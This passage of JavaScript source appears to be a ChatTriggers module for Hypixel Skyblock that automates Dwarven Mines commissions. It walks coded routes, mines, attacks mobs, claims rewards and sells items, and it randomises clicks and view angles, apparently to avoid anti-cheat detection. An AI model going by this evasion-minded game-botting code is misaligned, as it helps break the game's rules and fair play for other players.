import Skyblock from "BloomCore/Skyblock"
let { SettingSlider, SettingToggle, ConfigModuleClass, getKeyBind, ModuleManager } = global.settingSelection
let { chat, NumberUtils, MathUtils, TimeHelper, Rotations, ItemUtils, MovementHelper, MiningUtils, GuiInventory, SmartFailsafe, InventoryUtils } = global.export
let { S08PacketPlayerPosLook, Vec3, RenderUtils, Vector, RdbtPathFinder, Utils, S2DPacketOpenWindow, S30PacketWindowItems, overlayManager, MouseUtils, mc, registerEventSB, MiningBot } = global.export
global.modules.push(new ConfigModuleClass("Commission Macro", "Mining", [new SettingSlider("Weapon Slot (Goblin)", 1, 1, 9), new SettingToggle("Pigeonless", true)], ["Does Dwarven Mines commissions without an etherwarp item"]))
class commissionMacro {
  constructor() {
    this.ModuleName = "Commission Macro"
    this.Enabled = false

    // Create Overlay
    this.OVERLAY_ID = "COMMISSION"
    overlayManager.AddOverlay(this.ModuleName, this.OVERLAY_ID)

    this.key = getKeyBind("Commission Macro", "Rdbt Client v4 - Mining", this)

    // Store previous state when selling
    this.previousState = null
    this.previousAction = null
    this.previousRouteIndex = null
    this.previousRoute = null

    this.MacroStates = {
      WAITING: 0,
      MINING: 1,
      WALKINGTOPOINTS: 2,
      WALKINGTOCOMM: 4,
      AOTVING: 5,
      KILLING: 6,
      WALKINGSLAYERROUTE: 7,
      WALKINGTOSLAYERMOB: 8,
      WARPINGFORGE: 9,
      CLAIMINGCOMM: 10,
      GOBLINSLAYER: 11,
      ICEWALKERSLAYER: 12,
      TREASURESLAYER: 13,
      TRAVERSING: 14,
      TRYCLAIM: 15,
      SWAPPINGPICKAXE: 16,
      REFUELING: 17,
      SELLING: 18,
    }
    this.state = this.MacroStates.WAITING

    this.MacroActions = {
      WAITING: 0,
      AOTVING: 1,
      HITTING: 2,
      WALKING: 3,
      WAITINGONS08: 4,
      GETTINGCOMM: 5,
      MOVINGTOLOCATION: 6,
      SCANNINGPICKAXE: 7,
      PUTTINGPICKAXE: 8,
      WAITINGPUTTINGPICKAXE: 9,
      WAITCHECKINGPICKAXE: 10,
      CHECKINGPICKAXE: 11,
      WAITSCANNINGPICKAXE: 12,
      NPCINTERACTSELL: 14,
      NPCSELLING: 15,
      SCANPATH: 16,
      SCANNINGPATH: 17,
      MOVE: 18,
      WARP: 19,
    }
    this.action = this.MacroActions.WAITING

    this.routeTarget
    this.newCommission

    this.aspectOfTheVoid
    this.drill
    this.goblinSlot

    this.npcClaim = [
      [new Point(3, 157, -51, true), new Point(6, 157, -29, true), new Point(9, 154, -19, true), new Point(20, 149, -5, true), new Point(41, 135, 15, true)],
      [new Point(10, 150, -16, true), new Point(13, 145, -11, true), new Point(27, 142, 0, true), new Point(41, 136, 17, true)],
    ]

    this.npcRefuel = [new Point(-2, 149, -69, false), new Point(-5, 147, -60, false), new Point(-4, 150, -45, true), new Point(-5, 147, -36, false), new Point(-7, 145, -21, false)]

    this.Commissions = [
      new Commission(
        false,
        false,
        new Data(["Royal Mines Titanium", "Royal Mines Mithril"], {
          splitRoute: [new Point(74, 140, 37, true), new Point(107, 157, 41, true), new Point(130, 159, 31, true)],
          routes: {
            route1: [new Point(166, 150, 35, false), new Point(177, 150, 52, false), new Point(174, 150, 77, false), new Point(167, 149, 88, false)],
            route2: [new Point(145, 160, 34, true), new Point(160, 164, 34, true), new Point(166, 166, 21, true), new Point(168, 163, 12, true)],
          },
          fromForge: false,
        }),
      ),
      new Commission(
        false,
        false,
        new Data(["Cliffside Veins Mithril", "Cliffside Veins Titanium"], {
          splitRoute: [new Point(37, 128, 33, true), new Point(29, 128, 43, true)],
          routes: {
            route1: [new Point(25, 129, 32, false), new Point(26, 129, 26, false)],
            route2: [new Point(-1, 128, 50, true), new Point(-17, 127, 40, true), new Point(-15, 127, 32, false)],
            route3: [new Point(8, 129, 39, true)],
          },
          fromForge: false,
        }),
      ),
      new Commission(
        false,
        false,
        new Data(["Upper Mines Titanium", "Upper Mines Mithril"], {
          splitRoute: [new Point(-6, 159, -12, true), new Point(-49, 188, -34, true), new Point(-58, 164, -40, true), new Point(-73, 158, -39, false), new Point(-93, 159, -56, false), new Point(-112, 167, -69, false)],
          routes: {
            route1: [new Point(-112, 166, -75, false)],
            route2: [new Point(-122, 171, -71, false), new Point(-124, 170, -76, false)],
            route3: [new Point(-122, 171, -71, false), new Point(-134, 173, -60, false), new Point(-123, 176, -51, false), new Point(-115, 181, -63, false), new Point(-95, 187, -67, false), new Point(-76, 188, -71, false)],
          },
          fromForge: true,
        }),
      ),
      new Commission(
        false,
        false,
        new Data(["Rampart's Quarry Titanium", "Rampart's Quarry Mithril", "Titanium Miner", "Mithril Miner"], {
          splitRoute: [new Point(-6, 159, -12, true), new Point(-49, 188, -34, true), new Point(-58, 164, -40, true), new Point(-73, 158, -39, false)],
          routes: {
            route1: [new Point(-96, 170, -2, true), new Point(-100, 148, 13, false)],
            route2: [new Point(-90, 154, -32, false), new Point(-106, 150, -19, false), new Point(-114, 153, -35, false)],
            route3: [new Point(-96, 152, -27, false), new Point(-107, 148, -5, false), new Point(-91, 148, -11, false), new Point(-88, 147, -14, false)],
          },
          fromForge: true,
        }),
      ),
      new Commission(
        false,
        false,
        new Data(["Lava Springs Mithril", "Lava Springs Titanium"], {
          splitRoute: [new Point(4, 148, -35, true), new Point(4, 154, -16, true), new Point(31, 208, -7, true)],
          routes: {
            route1: [new Point(50, 225, -1, true), new Point(50, 207, 18, true)],
            route2: [new Point(43, 205, -11, true), new Point(55, 196, -17, false), new Point(50, 198, -26, false)],
            route3: [new Point(43, 205, -11, true), new Point(43, 198, -20, false)],
          },
          fromForge: true,
        }),
      ),
      new Commission(
        true,
        false,
        new Data(["Goblin Slayer"], {
          splitRoute: [
            new Point(27, 130, 44, true),
            new Point(0, 129, 50, true),
            new Point(-3, 129, 117, true),
            new Point(-3, 129, 168, true),
            new Point(-28, 132, 162, true),
            new Point(-66, 138, 152, true),
            new Point(-86, 140, 147, false),
            new Point(-105, 145, 138, false),
            new Point(-125, 147, 149, false),
            new Point(-137, 144, 142, false),
          ],
          fromForge: false,
        }),
      ),
      new Commission(
        true,
        false,
        new Data(["Glacite Walker Slayer"], {
          splitRoute: [new Point(27, 130, 44, true), new Point(0, 129, 50, true), new Point(-3, 128, 117, true), new Point(-3, 128, 149, true)],
          fromForge: false,
        }),
      ),
      new Commission(
        true,
        false,
        new Data(["Treasure Hoarder Puncher"], {
          splitRoute: [
            new Point(-6, 159, -12, true),
            new Point(-49, 188, -34, true),
            new Point(-58, 164, -40, true),
            new Point(-75, 160, -40, true),
            new Point(-107, 200, -30, true),
            new Point(-117, 210, -51, true),
            new Point(-117, 205, -56, false),
          ],
          fromForge: true,
        }),
      ),
    ]
    this.commissionNames = [
      "Royal Mines Titanium",
      "Royal Mines Mithril",
      "Goblin Slayer",
      "Glacite Walker Slayer",
      "Lava Springs Mithril",
      "Lava Springs Titanium",
      "Rampart's Quarry Titanium",
      "Rampart's Quarry Mithril",
      "Titanium Miner",
      "Mithril Miner",
      "Upper Mines Titanium",
      "Upper Mines Mithril",
      "Cliffside Veins Mithril",
      "Cliffside Veins Titanium",
      "Treasure Hoarder Puncher",
    ]

    this.trashItems = ["Mithril", "Rune", "Glacite", "Goblin", "Cobblestone", "Stone", "Titanium"]

    this.goblinNames = Utils.makeJavaArray(["Goblin ", "Weakling ", "Murderlover "])
    this.forgeTimer = new TimeHelper()
    this.travelTimer = new TimeHelper()
    this.lookTimer = new TimeHelper()
    this.mobTimer = new TimeHelper()
    this.retargetTimer = new TimeHelper()
    this.lastSeenTimer = new TimeHelper()
    this.walkTimer = new TimeHelper()
    this.interactNpc = new TimeHelper()
    this.sellTimer = new TimeHelper()
    this.claimTimer = new TimeHelper()
    this.menuCooldown = new TimeHelper()
    this.mobId = 0
    this.startedKilling = false
    this.lastMobPosition = new BlockPos(0, 0, 0)
    this.mobTimer = new TimeHelper()
    this.mobWhitelist = []
    this.click = true
    this.claimCommission = false
    this.scanLocation = false
    this.canHit = false
    this.pickaxeTimer = new TimeHelper()
    this.refueling = false
    this.commissionCounter = new TimeHelper()
    this.sellingToNpc = false
    this.lastCommissionNames = ["", ""]

    this.route = []
    this.routeTarget = null
    this.routeIndex = 0

    this.lookCooldown = new TimeHelper()
    this.walkToNpc = false

    this.commissionCount = 0
    this.startTime = Date.now()

    this.mobpos = null
    this.warningMessage = false
    register("renderWorld", () => {
      if (this.route.length > 0) {
        RenderUtils.renderCordsWithNumbers(this.route)
      }
      if (this.mobpos) RenderUtils.renderCube([this.mobpos.x, this.mobpos.y, this.mobpos.z], [0, 1, 0], true, 0.2, 1, 1)
    })

    // Update Commissions Overlay

    this.commissions = []
    register("step", () => {
      if (!this.Enabled) return

      try {
        let tabItems = TabList.getNames()

        let startIndex, commiecount

        tabItems.forEach((item, index) => {
          if (item?.removeFormatting()?.startsWith("Commissions")) startIndex = index
        })

        for (i = 1; i <= 5; i++) {
          if (tabItems[startIndex + i + 1].removeFormatting() === "") {
            commiecount = i
            break
          }
        }

        this.commissions = []
        for (i = 1; i <= commiecount; i++) {
          let c = tabItems[startIndex + i]
          let n = c.removeFormatting().split(":")
          let p
          if (n[1].includes("DONE")) {
            p = 1
          } else {
            p = parseFloat(n[1].replace(" ", "").replace("%", "")) / 100
          }

          this.commissions.push({
            name: n[0],
            progress: p,
          })

          overlayManager.AddOverlayBar(this.OVERLAY_ID, i.toString(), p, n[0])
        }
      } catch (e) {}

      overlayManager.UpdateOverlayLine(this.OVERLAY_ID, "TIME", `Session Time: ${NumberUtils.timeSince(this.startTime)}`)
    }).setDelay(1)

    register("tick", () => {
      if (this.Enabled) {
        if (this.state === this.MacroStates.TRAVERSING) {
          // lobby -> mines -> forge
          // mines -> forge
          // hub -> forge
          let lobby = [12, 75, 0]
          let mines = [-49, 200, -122]
          let hub = [-3, 70, -70]
          let limbo = [-22, 31, 22]
          if (MathUtils.distanceToPlayer(limbo).distance < 10.0) {
            if (this.travelTimer.hasReached(3000)) {
              ChatLib.command("l")
              this.travelTimer.reset()
            }
            return
          }
          this.travelTimer.reset()
          if (MathUtils.distanceToPlayer(lobby).distance < 10.0) {
            if (this.travelTimer.hasReached(3000)) {
              ChatLib.command("skyblock")
              this.travelTimer.reset()
            }
            return
          }
          if (MathUtils.distanceToPlayer(mines).distance < 10.0) {
            if (this.travelTimer.hasReached(3000)) {
              this.warpForge()
            }
            return
          }
          if (MathUtils.distanceToPlayer(hub).distance < 10.0) {
            if (this.travelTimer.hasReached(3000)) {
              this.warpForge()
            }
            return
          }
          this.travelTimer.reset()
        }

        if (this.state === this.MacroStates.WARPINGFORGE) {
          this.travelTimer.reset()
          // forge spawn 0.5 149 -68.5
          if (this.forgeTimer.hasReached(1500)) {
            this.state = this.MacroStates.WALKINGTOPOINTS
            this.action = this.MacroActions.SCANPATH
            this.walkTimer.reset()
            MovementHelper.setCooldown()
            if (this.refueling) {
              this.clearRoute()
              this.route = this.npcRefuel
            } else if (this.claimCommission) {
              // sets the route that gets used to walk across
              this.clearRoute()
              if (this.pigeonless) this.route = this.npcClaim[Math.floor(Math.random() * this.npcClaim.length)]
              else this.route = []
              this.claimCommission = false
            }
            chat.debugMessage("Warped to the forge")
            this.walkTimer.reset()
            this.newCommission.mining = false
            return
          }
          if (MathUtils.distanceToPlayerFeet([0.5, 149, -68.5]).distance < 3.0) {
            return
          }
          this.forgeTimer.reset()
        }

        if (this.state === this.MacroStates.WALKINGTOPOINTS) {
          if (Client.currentGui.getClassName() != "null") {
            return MovementHelper.stopMovement()
          }
          Player.setHeldItemIndex(this.aspectOfTheVoid.slot)
          if (this.action === this.MacroActions.SCANPATH) {
            this.routeTarget = this.route[this.routeIndex]
            this.action = this.MacroActions.WARP
            this.walkTimer.reset()
            Utils.makeRandomPitch(5.0, 15.0)
            Rotations.stopRotate()
            if (this.routeTarget === undefined) {
              this.processLastPoint()
              Client.scheduleTask(1, () => {
                MovementHelper.stopMovement()
              }) //test
              return
            }
          }
          if (this.routeTarget.etherwarp) {
            return
          } else if (this.routeTarget.aotv) {
            MovementHelper.setKey("space", false)
            let targetPoint = this.route[this.routeIndex]
            let targetVector = new Vector(targetPoint.x + 0.5, targetPoint.y + 0.5, targetPoint.z + 0.5)
            MovementHelper.setKeysForStraightLine(MathUtils.calculateAngles(targetVector).yaw, true)
            if (MathUtils.getDistanceToPlayer(targetVector).distance < 11.0) {
              // 11 assuming transmission tuner
              this.routeIndex++
              this.action = this.MacroActions.SCANPATH
            } else if (this.action === this.MacroActions.WARP) {
              Rotations.rotateTo(targetVector, 4)
              Rotations.onEndRotation(() => {
                ItemUtils.rightClick()
              })
              this.action = this.MacroActions.WAITINGONS08
            }
          } else {
            let vector = new Vector(this.routeTarget.x, this.routeTarget.y, this.routeTarget.z)
            let point = vector.add(0.5, 0.5, 0.5)
            let range = MathUtils.getDistanceToPlayer(point)
            if (range.distance < 3.5 && range.distanceFlat < 2.5) {
              this.action = this.MacroActions.SCANPATH
              this.routeIndex++
              return
            }
            if (!Rotations.rotate) Rotations.rotateTo([point.x, Player.getY() + 1.45, point.z], 1.0, true, Utils.getRandomPitch())
            else Rotations.updateTargetTo([point.x, Player.getY() + 1.45, point.z], 1.0, true, Utils.getRandomPitch())
            MovementHelper.setKey("sprint", true)
            MovementHelper.setKeysForStraightLine(MathUtils.calculateAngles(point).yaw, true)
            if (Player.getMotionY() > 0.0 || Math.abs(MathUtils.calculateAngles(point).yaw) > 20)
              Client.scheduleTask(1, () => {
                MovementHelper.stopMovement()
              }) //test
            if (this.routeIndex + 1 === this.route.length && this.newCommission.mining) {
              MovementHelper.setKey("sprint", false)
              if (range.distance < 8.0 && range.distanceFlat < 3.0 && point.y - 1.5 === Math.round(Player.getY() - 1)) {
                MovementHelper.setKey("shift", true)
              } else {
                MovementHelper.setKey("shift", false)
              }
            }
          }

          if (this.walkTimer.hasReached(7000)) {
            this.sendMacroMessage("Travelling took too long.")
            this.warpHub()
          }
        }

        if (this.state === this.MacroStates.TRYCLAIM) {
          if (this.walkToNpc) {
            if (!Rotations.rotate) Rotations.rotateTo([42.5, 136, 22.5])
            if (MathUtils.getDistanceToPlayer(42.5, 134.5, 22.5).distanceFlat <= 3) MovementHelper.setKey("shift", true)
            if (MathUtils.getDistanceToPlayer(42.5, 134.5, 22.5).distanceFlat <= 2) {
              MovementHelper.unpressKeys()
              this.walkToNpc = false
            } else {
              MovementHelper.setKeysForStraightLine(MathUtils.calculateAngles([42.5, 136, 22.5]).yaw, false)
            }
          } else if (this.interactNpc.hasReached(500)) {
            this.interactNpc.reset()
            if (this.interactWithNpc(42.5, 134.5, 22.5)) {
              this.state = this.MacroStates.CLAIMINGCOMM
              this.menuCooldown.reset()
            }
          }
          if (this.claimTimer.hasReached(5000)) {
            this.sendMacroMessage("Took too long to claim the commission.")
            this.sendMacroMessage("If this continues to happen then you have to manually complete a commission.")
            this.warpHub()
          }
        }

        if (this.state === this.MacroStates.CLAIMINGCOMM) {
          if (Player.getContainer()?.getName() === "Commissions") {
            if (!this.menuCooldown.hasReached(500)) return
            // collecting completed commissions
            let Inventory = Player.getContainer()
            for (let i = 9; i < 17; i++) {
              let stack = Inventory.getStackInSlot(i)
              if (stack) {
                let lore = stack.getLore()
                for (let t = 0; t < lore.length; t++) {
                  if (lore[t].includes("COMPLETED")) {
                    Inventory.click(i, false, "LEFT")
                    this.inventoryIsLoaded = false
                    this.menuCooldown.reset()
                    return
                  }
                }
              }
            }
            this.processCommissions()
          } else {
            this.menuCooldown.reset()
          }
          if (this.claimTimer.hasReached(4000)) {
            this.sendMacroMessage("Took too long to claim the commission.")
            this.warpHub()
          }
        }

        if (this.state === this.MacroStates.MINING) {
          if (!MiningBot.Enabled) {
            MiningBot.toggle(
              MiningBot.MACROTYPES.COMMISSION,
              this.newCommission?.data?.Name?.toString()?.toLowerCase()?.includes("titanium"),
              this.miningSpeed,
              this.drill,
              this.drill, //I don't give a fuck about bluecheese
            )
          }
        }

        if (this.state === this.MacroStates.GOBLINSLAYER || this.state === this.MacroStates.ICEWALKERSLAYER || this.state === this.MacroStates.TREASURESLAYER) {
          SmartFailsafe.reset()
          let slayerMobs
          if (this.state === this.MacroStates.GOBLINSLAYER) {
            if (!global.export.ItemFailsafe.triggered) Player.setHeldItemIndex(this.goblinSlot.slot)
            slayerMobs = this.getGoblins()
          }
          if (this.state === this.MacroStates.ICEWALKERSLAYER) {
            if (!global.export.ItemFailsafe.triggered) Player.setHeldItemIndex(this.pickaxe.slot)
            slayerMobs = this.getIceWalkers()
          }
          if (this.state === this.MacroStates.TREASURESLAYER) {
            if (!global.export.ItemFailsafe.triggered) Player.setHeldItemIndex(this.pickaxe.slot)
            slayerMobs = this.getTreasureHoarders()
          }
          if (this.mobWhitelist.length >= 3.0) this.mobWhitelist.shift()

          if (Client.currentGui.getClassName() != "null") {
            MovementHelper.stopMovement()
            Rotations.stopRotate()
            return
          }

          let closest = this.retargetTimer.hasReached(1000) ? null : World.getWorld().func_73045_a(this.mobId)
          if (closest instanceof net.minecraft.client.entity.EntityOtherPlayerMP) {
            if (closest.func_110143_aJ() > 1.1) closest = new Entity(closest)
            else closest = null
          }
          if (!closest) {
            let lowest
            slayerMobs.forEach(mob => {
              let cost = MathUtils.getDistanceToPlayer(mob).distance
              if (!closest || cost < lowest) {
                closest = mob
                lowest = cost
              }
            })
          }

          if (!closest) {
            //do stuff
            if (this.state === this.MacroStates.ICEWALKERSLAYER) {
              Rotations.rotateTo([0, 127, 160])
              MovementHelper.stopMovement()
            }
            if (this.state === this.MacroStates.GOBLINSLAYER) {
              if (!RdbtPathFinder.currentNode) RdbtPathFinder.findPath(Utils.getPlayerNode().getBlockPos(), new BlockPos(-134, 143, 142))
              if (RdbtPathFinder.currentNode && MathUtils.getDistanceToPlayer([-134, 143, 142]).distance > 5.0) {
                MovementHelper.setKeysForStraightLine(MathUtils.calculateAngles(RdbtPathFinder.currentNode.point).yaw)
                if (!Rotations.rotate) Rotations.rotateTo(new Vector(RdbtPathFinder.currentNode.lookPoint))
                else Rotations.updateTargetTo(new Vector(RdbtPathFinder.currentNode.lookPoint))
              } else {
                MovementHelper.stopMovement()
              }
            }
            if (this.state === this.MacroStates.TREASURESLAYER) {
              Rotations.rotateTo([-115, 206, -57])
              MovementHelper.stopMovement()
            }
            return
          } else {
            RdbtPathFinder.clearPath()
          }

          let vectorTarget = new Vector(closest).add(0.0, 1.5, 0.0)
          if (!Rotations.rotate || this.mobId != closest.getEntity().func_145782_y()) {
            Rotations.rotateTo(vectorTarget)
            if (this.mobId != closest.getEntity().func_145782_y()) {
              this.mobTimer.reset()
              this.retargetTimer.reset()
              this.lastSeenTimer.reset()
              this.startedKilling = false
            }
          } else {
            Rotations.updateTargetTo(vectorTarget)
          }
          this.mobId = closest.getEntity().func_145782_y()
          let range = MathUtils.getDistanceToPlayer(vectorTarget)
          if (range.distanceFlat < 3.5) {
            MovementHelper.stopMovement()
            this.startedKilling = true
            if (this.mobTimer.hasReached(1000) || range.differenceY + 1.5 > 2 || range.differenceY + 1.5 < -5) {
              this.mobWhitelist.push(this.mobId)
              this.mobId = -10
            } else if (range.differenceY + 1.5 < -2) {
              MovementHelper.setKey("space", true)
            }
          } else {
            MovementHelper.setKey("sprint", true)
            MovementHelper.setKeysForStraightLine(MathUtils.calculateAngles(vectorTarget).yaw)
            if (!this.startedKilling) this.mobTimer.reset()
          }
          if (range.distance < 6.0) {
            this.click = !this.click
            if (this.click && Math.random() > 0.2) ItemUtils.leftClick()
          }
          if (Player.asPlayerMP().canSeeEntity(closest)) {
            this.lastSeenTimer.reset()
          } else if (this.lastSeenTimer.hasReached(250)) {
            this.mobWhitelist.push(this.mobId)
            this.mobId = -10
          }
        }

        if (this.state === this.MacroStates.SWAPPINGPICKAXE) {
          if (this.action === this.MacroActions.WAITSCANNINGPICKAXE && this.pickaxeTimer.hasReached(1000)) {
            this.action = this.MacroActions.SCANNINGPICKAXE
          }
          if (this.action === this.MacroActions.WAITINGPUTTINGPICKAXE && this.pickaxeTimer.hasReached(1000)) {
            this.action = this.MacroActions.PUTTINGPICKAXE
          }
          if (this.action === this.MacroActions.WAITCHECKINGPICKAXE && this.pickaxeTimer.hasReached(1000)) {
            this.action = this.MacroActions.CHECKINGPICKAXE
          }
          if (this.action === this.MacroActions.SCANNINGPICKAXE) {
            this.pickaxeIndex = undefined
            let isIceWalkerWeapon = this.drill.slot === this.pickaxe.slot
            if (this.checkPickaxe(isIceWalkerWeapon)) {
              return
            }
            Player.getContainer()
              .getItems()
              .forEach((item, slot) => {
                if (item?.getName()?.toString()?.includes("2000")) {
                  this.pickaxeIndex = slot
                }
              })
            if (this.pickaxeIndex === undefined) {
              this.stopMacroWithWarning("Didn't find a new Pickonimbus!")
              return
            }
            mc.func_147108_a(new GuiInventory(Player.getPlayer()))
            this.action = this.MacroActions.WAITINGPUTTINGPICKAXE
            this.pickaxeTimer.reset()
          }
          if (this.action === this.MacroActions.PUTTINGPICKAXE) {
            Player.getContainer().click(this.pickaxeIndex, true, "LEFT")
            this.action = this.MacroActions.WAITCHECKINGPICKAXE
            this.pickaxeTimer.reset()
          }
          if (this.action === this.MacroActions.CHECKINGPICKAXE) {
            let isIceWalkerWeapon = this.drill.slot === this.pickaxe.slot
            if (this.checkPickaxe(isIceWalkerWeapon)) {
              InventoryUtils.closeInv()
              return
            } else {
              this.stopMacroWithWarning("Something went wrong somehow report this!")
            }
          }
        }

        if (this.state === this.MacroStates.REFUELING) {
          this.state = this.MacroStates.WAITING
          MiningUtils.startRefuel(this.drill)
          this.interactWithNpc(-6.5, 145.0, -18.5)
          MiningUtils.onReFuelDone(succes => {
            this.refueling = false
            if (!succes) {
              this.stopMacroWithWarning("No fuel found")
              return
            }
            let drills = MiningUtils.getDrills()
            this.drill = drills.drill
            this.blueCheeseSlot = drills.blueCheese
            if (!this.drill) {
              this.sendMacroMessage("Unable to find new drill, please report this issue.")
              return
            }
            if (!this.blueCheeseSlot) this.blueCheeseSlot = this.drill
            this.claimCommission = true
            this.newCommission = new Commission(false, true)
            this.warpForge()
          })
        }

        if (this.state === this.MacroStates.SELLING) {
          if (this.action === this.MacroActions.NPCINTERACTSELL) {
            ChatLib.command("trades")
            this.sellTimer.reset()
            this.action = this.MacroActions.NPCSELLING
          }
          if (this.action === this.MacroActions.NPCSELLING) {
            if (Player.getContainer()?.getName() === "Trades" && this.sellTimer.hasReached(400)) {
              let found = false
              Player.getContainer()
                .getItems()
                .forEach((item, slot) => {
                  if (found) return
                  if (!item) return
                  if (slot > 53) {
                    let name = item.getName().removeFormatting()
                    for (let i = 0; i < this.trashItems.length; i++) {
                      if (name.includes(this.trashItems[i]) && !name.includes("Drill") && !name.includes("Pickaxe") && !name.includes("Tasty")) {
                        Player.getContainer().click(slot, false, "LEFT")
                        this.sellTimer.reset()
                        found = true
                        continue
                      }
                    }
                  }
                })
              if (!found) {
                InventoryUtils.closeInv()
                this.state = this.MacroStates.WAITING
                this.sellingToNpc = false

                if (!this.Enabled) return
                chat.debugMessage("Sold items successfully!")

                // Restore previous state if available
                if (this.previousState !== null) {
                  this.state = this.previousState
                  this.action = this.previousAction
                  this.routeIndex = this.previousRouteIndex

                  // Restore route if needed
                  if (this.previousRoute && this.previousRoute.length > 0) {
                    this.route = [...this.previousRoute]
                  }

                  chat.debugMessage("Resuming previous activity...")
                  this.previousState = null
                  this.previousAction = null
                  this.previousRoute = null
                } else {
                  this.newCommission = new Commission(false, true)
                  this.claimCommission = true
                  this.warpForge()
                }
              }
            }
          }
        }
      }
    })

    register("worldUnload", () => {
      if (this.Enabled && this.state != this.MacroStates.WARPINGFORGE && this.state != this.MacroStates.TRAVERSING) {
        if (this.state === this.MacroStates.MINING) {
          MiningBot.stopBot()
        }
        MovementHelper.stopMovement()
        this.state = this.MacroStates.TRAVERSING
        this.newCommission = new Commission(false, true)
        this.claimCommission = true
        this.travelTimer.reset()
      }
    })

    register("chat", Event => {
      if (!this.Enabled) return
      let msg = ChatLib.getChatMessage(Event, false)
      if (msg.startsWith("Oh no!")) {
        this.state = this.MacroStates.SWAPPINGPICKAXE
        this.action = this.MacroActions.WAITSCANNINGPICKAXE
        this.pickaxeTimer.reset()
        MiningBot.stopBot()
      }
    })

    register("chat", Event => {
      if (!this.Enabled || this.state != this.MacroStates.TRAVERSING) return
      let msg = ChatLib.getChatMessage(Event, false)
      if (msg.startsWith("Are you sure? Type /lobby")) {
        Client.scheduleTask(10, () => {
          ChatLib.command("lobby")
        })
      }
    })

    registerEventSB("fullinventory", () => {
      if (this.Enabled && !this.sellingToNpc) {
        this.sendMacroMessage("Detected full inventory!")
        MiningBot.stopBot()

        // Save current state before switching to selling
        this.previousState = this.state
        this.previousAction = this.action
        this.previousRouteIndex = this.routeIndex
        this.previousRoute = [...this.route]

        this.sellingToNpc = true
        this.state = this.MacroStates.SELLING
        this.action = this.MacroActions.NPCINTERACTSELL
        Rotations.stopRotate()
      }
    })

    register("chat", Event => {
      if (!this.Enabled) return
      let chatmsg = ChatLib.getChatMessage(Event, false)
      if (!this.commissionNames.some(name => chatmsg.startsWith(name.toUpperCase()))) return
      if (this.state === this.MacroStates.MINING || this.state === this.MacroStates.GOBLINSLAYER || this.state === this.MacroStates.ICEWALKERSLAYER || this.state === this.MacroStates.TREASURESLAYER) {
        this.commissionCount++

        overlayManager.UpdateOverlayLine(this.OVERLAY_ID, "COMMS_HOUR", "Commissions/Hour: " + Math.ceil(this.commissionCount / (this.commissionCounter.getTimePassed() / (1000 * 3600))))
        overlayManager.UpdateOverlayLine(this.OVERLAY_ID, "COMMS", "Session Commissions: " + this.commissionCount)
        overlayManager.UpdateOverlayLine(this.OVERLAY_ID, "COMMS_HOTM", "Session HOTM XP: " + this.commissionCount * 400)

        Rotations.stopRotate()
        MiningBot.stopBot()
        let macroState = this.state
        this.state = this.MacroStates.WAITING
        RdbtPathFinder.clearPath()
        this.mobpos = null
        Client.scheduleTask(10, () => {
          if (!this.Enabled) return
          if (this.pigeonless || macroState === this.MacroStates.GOBLINSLAYER || macroState === this.MacroStates.ICEWALKERSLAYER || macroState === this.MacroStates.TREASURESLAYER) {
            this.warpForge()
          }
          this.lastCommissionNames = [this.newCommission.data.Names[0], this.newCommission.data.Names[1]]
          this.claimCommission = true
          this.newCommission = new Commission(false, true)
          if (!this.pigeonless) {
            this.clearRoute()
            this.route = []
            this.state = this.MacroStates.WALKINGTOPOINTS
            this.action = this.MacroActions.SCANPATH
          }
        })
      }
    })

    registerEventSB("incombat", () => {
      if (!this.Enabled) return
      this.warpHub()
    })

    registerEventSB("emptydrill", () => {
      if (!this.Enabled) return
      if (this.state === this.MacroStates.MINING) {
        Rotations.stopRotate()
        MiningBot.stopBot()
        this.state = this.MacroStates.WAITING
        this.refueling = true
        Client.scheduleTask(20, () => {
          this.warpForge()
        })
      }
    })

    registerEventSB("death", () => {
      if (!this.Enabled) return
      MovementHelper.stopMovement()
      Rotations.stopRotate()
      MiningBot.stopBot()
      this.state = this.MacroStates.WAITING
      Client.scheduleTask(70, () => {
        this.newCommission = new Commission(false, true)
        this.claimCommission = true
        this.warpForge()
      })
    })

    register("packetReceived", Packet => {
      if (!this.Enabled) return
      if (this.action === this.MacroActions.WAITINGONS08) {
        Client.scheduleTask(0, () => {
          this.action = this.MacroActions.WARP
        })
      }
    }).setFilteredClasses([S08PacketPlayerPosLook])

    this.windowId
    this.inventoryIsLoaded = false
    register("packetReceived", (Packet, Event) => {
      if (!this.Enabled) return
      if (Packet instanceof S30PacketWindowItems && this.state === this.MacroStates.CLAIMINGCOMM && !this.inventoryIsLoaded) {
        // Just to be sure the inventory is loaded
        Client.scheduleTask(1, () => {
          this.inventoryIsLoaded = true
        })
      }
    }).setFilteredClasses([S2DPacketOpenWindow, S30PacketWindowItems])
  }

  processCommissions() {
    let Inventory = Player.getContainer()
    let InventoryItems = Player.getContainer().getItems()
    for (let i = 0; i <= 35; i++) {
      if (InventoryItems[i] === null) return
    }
    let commissions = []
    for (let i = 9; i < 17; i++) {
      let stack = Inventory.getStackInSlot(i)
      if (stack) {
        for (let t = 0; t < this.Commissions.length; t++) {
          let lore = stack.getLore()
          for (let r = 0; r < lore.length; r++) {
            if (this.state != this.MacroStates.CLAIMINGCOMM) break
            let loreText = lore[r].removeFormatting()
            let index = this.Commissions[t].data.Names.indexOf(loreText)
            // checks if the commission is included in the given names
            if (index != -1 && !loreText.removeFormatting().includes("Golden Goblin")) {
              let commissionName = this.Commissions[t].data.Names[index]
              this.Commissions[t].data.Name = commissionName
              let commissionCost = 0
              if (commissionName.includes("Treasure Hoarder")) commissionCost = 0
              if (commissionName.includes("Titanium")) commissionCost = 5
              if (commissionName.includes("Mithril")) commissionCost = 10
              if (commissionName.includes("Glacite Walker")) commissionCost = 20
              if (commissionName.includes("Goblin")) commissionCost = 30
              commissions.push({
                commission: this.Commissions[t],
                cost: commissionCost,
              })
              break
            }
          }
        }
      }
    }
    let lowestCost = null
    let commission = null
    commissions.forEach(newCommission => {
      if (!commission || newCommission.cost < lowestCost) {
        commission = newCommission.commission
        lowestCost = newCommission.cost
      }
    })
    if (commission) {
      this.newCommission = commission
      this.clearRoute()
      this.route = this.newCommission.data.Data.splitRoute
      this.claimCommission = false
      this.walkTimer.reset()
      InventoryUtils.closeInv()
      chat.message("Current Commission: " + this.newCommission.data.Name)
      if (!this.newCommission.isSlayer) this.scanLocation = true
      if (!this.newCommission.data.Data.fromForge && this.pigeonless) {
        this.state = this.MacroStates.WALKINGTOPOINTS
        this.action = this.MacroActions.SCANPATH
        return
      }
      if (this.pigeonless) {
        this.warpForge()
      }
      let newNames = [this.newCommission.data.Names[0], this.newCommission.data.Names[1]].toString()
